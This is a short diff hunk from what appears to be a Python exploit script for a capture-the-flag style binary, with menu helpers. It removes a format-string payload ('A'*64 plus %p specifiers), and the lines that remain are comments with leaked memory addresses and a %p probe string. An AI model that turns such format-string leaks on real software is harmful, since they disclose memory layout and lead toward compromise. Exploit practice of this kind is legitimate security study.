@@ -45,9 +45,6 @@ def change_comment(index, address):
 
 print_menu()
 
-payload = 'A'*64 + '%9$p-%13$p-%6$p-'
-#buy(2,'1'*11,payload)
-
 #0x7fffffffb670.0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd9700.0xc.0x7fffffffdd10.0x555555758020
 #AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p
 
